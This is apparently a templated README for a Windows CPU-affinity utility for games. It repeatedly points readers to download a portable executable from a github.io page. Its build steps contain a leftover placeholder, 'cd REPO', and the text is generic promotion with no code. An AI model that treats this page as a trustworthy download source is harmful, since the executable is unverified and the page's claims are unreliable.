# CPU Affinity Manager v2026 - CPU Affinity Manager 2026

> **CPU Affinity Manager is a portable Windows utility for assigning game processes to selected CPU cores, applying saved scheduler preferences, and reapplying those rules automatically in version 2026.**

[![Platform](https://img.shields.io/badge/Platform-Windows-blue?style=flat-square)](https://github.com)
[![Version](https://img.shields.io/badge/Version-v2026-green?style=flat-square)](https://github.com)
[![Updated](https://img.shields.io/badge/Updated-2026-red?style=flat-square)](https://github.com)
[![License](https://img.shields.io/badge/License-GPL--3.0-yellow?style=flat-square)](LICENSE)
[![Stars](https://img.shields.io/github/stars/louiswood42/cpu-affinity-manager-win-51619?style=flat-square)](https://github.com/louiswood42/cpu-affinity-manager-win-51619)

---

<p align="center">
  <a href="https://louiswood42.github.io/cpu-affinity-manager-win-51619/">
    <img src="https://img.shields.io/badge/Download-CPU%20Affinity%20Manager%20Latest-brightgreen?style=for-the-badge" alt="Download CPU Affinity Manager">
  </a>
</p>

> **[Direct Download - CPU Affinity Manager v2026](https://louiswood42.github.io/cpu-affinity-manager-win-51619/)**

---

[Download Latest Build](https://louiswood42.github.io/cpu-affinity-manager-win-51619/)

---

## About CPU Affinity Manager

CPU Affinity Manager helps Windows users associate individual games with selected processor cores and process priority classes. It can distinguish performance cores from efficiency cores, making it easier to create repeatable CPU scheduling preferences for different workloads.

The utility is designed as a portable single executable, so it can be used without a traditional installation process. Once profiles are configured, it watches for matching game processes and reapplies the selected affinity settings automatically while recording the changes it makes.

---

## Features

- Save individual CPU affinity masks for different games.
- Apply process priority classes alongside affinity settings.
- Detect and target performance cores and efficiency cores.
- Monitor running processes and respond when configured games launch.
- Reapply per-game rules automatically during a session.
- Choose from one-click affinity mask presets.
- Review recorded affinity changes through the built-in log.
- Run as a portable utility on Windows 10 and Windows 11.

---

## Installation

### Download

1. Open the [latest build](https://louiswood42.github.io/cpu-affinity-manager-win-51619/).
2. Download the Windows executable.
3. Place it in a convenient folder.
4. Launch the executable directly.

CPU Affinity Manager is portable and does not require an installer. Keep the executable in a location where it can remain available whenever you want to use its saved profiles and process monitoring.

### Clone the repository

```bash
git clone https://github.com/louiswood42/cpu-affinity-manager-win-51619.git
cd REPO
```

Build or launch the project using the repository's available project instructions.

---

## Usage

1. Start CPU Affinity Manager.
2. Select or create a profile for a game.
3. Choose the desired CPU affinity mask or use a preset.
4. Select a process priority class when required.
5. Save the profile.
6. Launch the game and let the process watcher detect it.
7. Review the activity log to confirm that the configured affinity change was applied.

For systems with both P-cores and E-cores, use the core detection information to create profiles that match the workload you want to prioritize.

---

## Configuration

Configuration is managed through the application's per-game profiles. Each profile can contain:

- A target game or process.
- A CPU affinity mask.
- A process priority class.
- The selected performance or efficiency core arrangement.

Use the profile controls to adjust a game's settings rather than editing files manually. Changes are stored with the corresponding game profile and can be revised whenever your CPU layout or scheduling preferences change.

---

## Requirements

- Windows 10 or Windows 11.
- A Windows-compatible processor supported by the operating system.
- Sufficient access to observe and adjust the selected game processes.
- Storage space for the portable executable, saved profiles, and logs.
- No installer is required.

---

## FAQ

### Does CPU Affinity Manager require installation?

No. The utility is distributed as a portable single executable and can be launched from a chosen folder.

### Can I create different settings for different games?

Yes. Profiles store separate affinity masks and priority classes for individual games or processes.

### What happens when a configured game starts?

The process watcher looks for matching game processes and applies the associated profile when they appear.

### Can I use P-cores and E-cores in profiles?

The utility detects performance and efficiency cores, allowing profiles to target the core groups relevant to your scheduling setup.

### Where can I check whether a rule was applied?

Review the application's affinity-change log for recorded process updates.

### How do I update the utility?

Download the newest build from the [latest download page](https://louiswood42.github.io/cpu-affinity-manager-win-51619/) and replace the previous executable as needed. Preserve any profile or configuration data stored separately from the executable.

### A profile did not apply. What should I check?

Confirm that the configured process matches the running game, verify that the profile was saved, and inspect the activity log for the detected process and attempted change.

### Is support available?

Use the repository's GitHub Issues section for bug reports, configuration questions, and feature discussions.

---

## Roadmap

- Improve profile management workflows.
- Expand visibility into process detection and applied rules.
- Refine preset handling for mixed performance and efficiency core layouts.
- Continue improving logging and day-to-day portability.

---

## License

GNU GPL v3.0 - see [LICENSE](LICENSE) for details.
